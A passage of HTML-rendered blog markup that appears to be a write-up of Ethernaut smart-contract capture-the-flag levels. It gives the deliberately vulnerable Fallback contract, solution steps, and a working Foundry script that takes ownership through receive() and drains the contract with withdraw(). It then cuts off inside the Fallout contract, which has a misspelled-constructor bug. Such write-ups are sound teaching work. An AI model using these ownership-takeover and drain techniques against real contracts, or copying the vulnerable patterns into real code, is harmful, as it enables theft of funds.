&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;level0Solve.s.sol:Level0Solve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;1-fallback&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-fallback&quot; aria-label=&quot;Anchor link for: 1-fallback&quot;&gt;1 Fallback&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Fallback {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) public contributions&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    contributions[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier onlyOwner {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;caller is not the owner&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        )&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;contribute&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    contributions[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(contributions[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;contributions[owner]) {
&lt;&#x2F;span&gt;&lt;span&gt;      owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getContribution&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;contributions[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() external payable {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;contributions[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal :&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Our goal is to become the owner of the contract and drain all the ether of it&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution :&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Fallback contract sets the owner variable in &lt;code&gt;receive()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;To set the owner we need to pass the require check in &lt;code&gt;receive()&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;To pass the check we have to send some ether with the &lt;code&gt;TX&lt;&#x2F;code&gt; and our sender should have some contributions in it.&lt;&#x2F;li&gt;
&lt;li&gt;So, Initially we will send contributions and then send some ether to the contract to invoke the &lt;code&gt;receive()&lt;&#x2F;code&gt; method.&lt;&#x2F;li&gt;
&lt;li&gt;After we sent the new owner as ourselves, we can call &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function to drain the contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Fallback} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;src&#x2F;Fallback.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Level0Solve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Fallback public level1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fallback&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67B71283A3a53C445f33Ea0a0F8E435cD1f283E1&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Original Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;level1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;        
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        level1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;contribute{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.0001 &lt;&#x2F;span&gt;&lt;span&gt;ether}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(level1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span&gt;wei}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;New Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;level1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Initial Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(level1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        level1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Final Balance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(level1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;FallbackSolve.s.sol:FallbackSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;2-fallout&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-fallout&quot; aria-label=&quot;Anchor link for: 2-fallout&quot;&gt;2 Fallout&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Fallout.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;@openzeppelin-contracts-06&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Fallout {
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  using SafeMath for uint256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) allocations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address payable public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;* constructor *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fal1out&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    allocations[owner] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier onlyOwner {
